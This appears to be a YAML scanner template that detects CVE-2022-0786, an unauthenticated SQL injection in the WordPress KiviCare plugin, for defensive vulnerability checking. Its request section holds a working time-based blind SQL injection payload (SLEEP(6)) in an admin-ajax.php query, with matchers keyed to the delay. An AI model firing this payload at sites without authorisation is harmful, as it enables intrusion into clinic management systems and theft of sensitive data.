id: CVE-2022-0786
info:
  name: WordPress KiviCare <2.3.9 - SQL Injection
  author: theamanrawat
  severity: critical
  description: The WordPress KiviCare plugin before version 2.3.9 is vulnerable to
    SQL injection which allows an attacker to execute unauthorized administrative
    operations, obtain sensitive information and modify data on the affected site.
  reference:
  - https://wpscan.com/vulnerability/53f493e9-273b-4349-8a59-f2207e8f8f30
  - https://wordpress.org/plugins/kivicare-clinic-management-system/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0786
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0786
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The SQL injection vulnerability in WordPress KiviCare plugin can lead
      to sensitive information theft, data alteration, and unauthorized administrative
      operations on the affected site.
    recommendation: It is highly recommended to update to the latest version of WordPress
      KiviCare plugin (2.3.9 or later) to prevent SQL injection vulnerability and
      potential malicious attacks.
  tags: sqli,kivicare-clinic-management-system,unauth,wordpress,wp-plugin,wp,cve,cve2022,wpscan
requests:
- raw:
  - '@timeout: 10s

    GET /wp-admin/admin-ajax.php?action=ajax_get&route_name=get_doctor_details&clinic_id=%7B"id":"1"%7D&props_doctor_id=1,2)+AND+(SELECT+42+FROM+(SELECT(SLEEP(6)))b
    HTTP/1.1

    Host: {{Hostname}}

    '
  matchers:
  - type: dsl
    dsl:
    - duration>=6
    - status_code == 200
    - contains(content_type, "text/html")
    - contains(body, "Doctor details")
    condition: and
